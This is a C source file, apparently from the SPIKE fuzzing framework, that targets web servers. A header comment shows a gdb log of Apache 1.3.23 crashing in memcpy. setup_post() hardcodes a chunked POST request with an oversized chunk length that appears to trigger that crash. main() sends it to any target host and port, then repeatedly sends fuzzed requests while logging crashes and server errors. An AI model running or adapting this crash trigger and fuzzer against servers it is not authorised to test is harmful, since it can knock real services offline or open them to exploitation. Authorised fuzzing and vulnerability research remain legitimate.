/* Start webfuzzprelude.c */
/*
  Server: Apache-AdvancedExtranetServer/1.3.23 (Mandrake Linux/4mdk) auth_ldap/1.6.0 mod_ssl/2.8.7 OpenSSL/0.9.6c PHP/4.1.2

  [Tue Jun 18 15:42:49 2002] [notice] child pid 17224 exit signal Segmentation fault (11)
  Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 1024 (LWP 17224)]
0x401b2d79 in memcpy () from /lib/libc.so.6
(gdb) where
#0  0x401b2d79 in memcpy () from /lib/libc.so.6
#1  0x080950a0 in ?? ()
#2  0x0806366f in ap_get_client_block ()
#3  0x08065b5f in ap_discard_request_body ()
#4  0xd8000000 in ?? ()
Cannot access memory at address 0x80975
(gdb) x/2i $pc
0x401b2d79 <memcpy+41>:	mov    0x1c(%edi),%edx
0x401b2d7c <memcpy+44>:	sub    $0x20,%ecx
(gdb) print/x $edi
$1 = 0xbfffffec
(gdb) q

*/



#include <stdio.h>
#include <stdlib.h>
#include <string.h> /*for memset*/
#include <sys/types.h>
#include <sys/socket.h>
#include <signal.h>

#include "spike.h"
#include "hdebug.h"
#include "tcpstuff.h"

#include "dlrpc.h"

/*change these to skip over variables*/
int SKIPFUZZSTR=0;
int SKIPVARIABLES=0;

void
setup_post()
{

s_string("POST /");
s_string(" HTTP/1.1\r\n");
s_string("Host: ");
s_string("DAVEAITEL");
s_string("\r\n");
s_string("User-Agent: ");
s_string("Mozilla/5.0");
s_string("Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\r\n");
s_string("Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\r\n");
s_string("Accept-Language: en\r\n");
s_string("Accept-Encoding: gzip, deflate, compress;q=0.9\r\n");
s_string("Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66\r\n");
s_string("Keep-Alive: 300\r\n");
s_string("Connection: keep-alive\r\n");
s_string("Content-type: application/x-www-form-urlencoded\r\n");
s_string("Transfer-Encoding: chunked\r\n");
//s_string("Content-Length: 0\r\n");
s_string("\r\n");
s_string("4\r\n");
s_string("AAAA\r\n");
s_string("f0000000\r\n");
//s_string("0\r\n");
//s_string("\r\n");
}


void
usage()
{
  fprintf(stderr,"Usage: ./generic_web_server_fuzz target port file.spk skipvariables skipfuzzstring\r\n");
  fprintf(stderr,"Example: ./gwsf exchange1 80 owa1.spk 0 0\n"); 
  fprintf(stderr,"http://www.immunitysec.com/spike.html\n");

  exit(-1);
}

int
main (int argc, char ** argv)
{
  int first;
  char * target;
  char buffer[150000];
  char requestbuffer[150000];
  int port;
  char * spkfile;
  struct spike * our_spike;
  unsigned long retval;
  int notfin;
  int firstfuzz;
  int fuzzvarnum,fuzzstrnum; /*for fuzz variable count*/
  unsigned long sentnum;

  if (argc!=6)
    {
      usage();
    }

  target=argv[1];
  printf("Target is %s\r\n",argv[1]);

  port=atoi(argv[2]);

  spkfile = argv[3];
  
  SKIPVARIABLES=atoi(argv[4]);
  SKIPFUZZSTR=atoi(argv[5]);

  our_spike=new_spike();
  s_init_fuzzing();

  /*sheesh.*/
  signal(SIGPIPE,SIG_IGN);

  if (our_spike==NULL)
    {
      fprintf(stderr,"Malloc failed trying to allocate a spike.\r\n");
      exit(-1); 
    }

  setspike(our_spike);
  setup_post();
  if (spike_send_tcp(target,port)==0)
    {
      printf("Couldn't connect to host or send data!\r\n");
      /*exit(-1);*/
    }
  
  /*during s_variable push, if fuzzstring is == currentfuzzstring
    then set didlastfuzzstring. If fuzzvariable is == current
    variable, set didlastfuzzvariable*/

  
  /*zeroth fuzz variable is first variable*/
  s_resetfuzzvariable();
  fuzzvarnum=0;
  fuzzstrnum=0;
  firstfuzz=1;

  while (!s_didlastvariable())
    {
      s_resetfuzzstring();
      /*zeroth fuzz string is no change*/


      if (firstfuzz)
      {
      /*zeroth fuzz string is no change*/
      /*see below for why we have this if statement and loop*/
      if (fuzzvarnum<SKIPVARIABLES )
        {
          for (fuzzvarnum=0; fuzzvarnum<SKIPVARIABLES; fuzzvarnum++)
            {
              s_incrementfuzzvariable();
            }
        }

      /*here is another part of where we implement the ability to jump to a particular
        place in the fuzzing*/
      if (fuzzstrnum<SKIPFUZZSTR)
        {
          for (fuzzstrnum=0; fuzzstrnum<SKIPFUZZSTR; fuzzstrnum++)
            {
              s_incrementfuzzstring();
            }
        }
      firstfuzz=0;
      }
      else
      {
              /*we reset this here so every new variable gets a new count*/
              fuzzstrnum=0;
      }


      
      while(!s_didlastfuzzstring())
	{
	  printf("Fuzzing Variable %d:%d\n",fuzzvarnum,fuzzstrnum);
	  //printf("clearing\n");	  
	  spike_clear();

#define MAXSEND 0x80000000
#define SENDNUM 0x4
	  sentnum=0;
	  printf("parsing %s\n",spkfile);
	  s_parse(spkfile);
	  while ((unsigned int)sentnum<(unsigned int)MAXSEND)
	    {
	      printf("sending\n");
	      if (spike_send()<0)
		{
		  printf("Couldn't connect to host or send data!\r\n");
	      /*exit(-1);*/
		}
	      sentnum+=SENDNUM;
	      printf("Sent %x\n",(unsigned int)sentnum);
	    }

	  /*see, the thing is that the spike is not guaranteed to be
            null terminated, so just a plain printf on the
            s_get_databuf() is ill-advised.*/
	  memset(requestbuffer,0x00,sizeof(requestbuffer));
	  if (s_get_size()>2500)
	    memcpy(requestbuffer,s_get_databuf(),2500);
	  else
           {
	    memcpy(requestbuffer,s_get_databuf(),s_get_size());
           }
  

	  /*here we print out our request*/
	  printf("Request:\n%.2500s\nEndRequest\n",requestbuffer);

	  first=1;
	  notfin=1;
	  retval=1;
          printf("Response:\n");
	  while(retval && notfin) 
	    {
 	     
	      memset(buffer,0x00,sizeof(buffer));
	      notfin=s_fd_wait();
	      notfin=s_fd_wait();
	      notfin=s_fd_wait();
	      if (!notfin)
                {
                 printf("Server didn't answer in time limit\n");
		break;
                }
	      retval=read(our_spike->fd,buffer,2500);
	if (first && (retval==-1 || retval==0) )
                {
                   printf("***Server closed connection!\n");
		   fprintf(stderr,"Request: %s\n",requestbuffer);
                   fprintf(stderr,"***Server closed connection!\n");
		   break;
                }
		first=0;
	      if (retval)
		{
		    if (strstr(buffer, "500 ok") 
			|| strstr(buffer,"Internal Server Error")
			) 
                    {
			fprintf(stderr,"Request: %s\n",requestbuffer);
			fprintf(stderr,"Response: %s\n",buffer);
                    }


		    printf("**%.500s**\n",buffer);
		  /*this is where you filter responses out that you don't want to bother seeing.*/
#if 0
		  /*don't print out 404 errors*/
		  if (!strstr(buffer,"404") && !strstr(buffer,"400 Bad Request") && !strstr(buffer,"check that it is entered correctly"))
 		break;
#endif
		  /*here we speed things up by no continuing to read past this dumb error message*/
		  /*do this same thing for any request that continues to slow you down and is non-interesting*/
                  if (strstr(buffer,"<TITLE>404"))
                    break;
                  if (strstr(buffer,"<TITLE>401"))
		    break;
		  if (strstr(buffer,"401 Access denied"))
		    break;
		  if (strstr(buffer,"Public: OPTIONS"))
		    break;
		  if (strstr(buffer,"Please do not alter this file"))
		    break;
		  if (strstr(buffer,"GIF89a"))
		    break;
		  if (strstr(buffer,"This object may be found <a HREF=\"localstart.asp\""))
	break;

		if (strstr(buffer,"home page, and then look for links to the information you want"))
		break;
		 if(strstr(buffer,"Location: localstart.asp"))
		break;
 		 if (strstr(buffer,"This is the default page that appears on new AOLserver installations"))
		break;
		if (strstr(buffer,"This page intentionally left blank."))
		break;
               }
	    }/*end while read loop*/
               printf("End response\n");
          fuzzstrnum++;
	  s_incrementfuzzstring();
	  //	  spike_close_tcp();
	  /*Use this for testing against netcat*/
	  /*
	    sleep(1);
	  */
	}/*end for each fuzz string*/
      fuzzvarnum++;
      s_incrementfuzzvariable();
    }/*end for each variable*/
  printf("Done.\n");
  return 0;
} /*end program*/

/* End webfuzzpostlude.c */ 

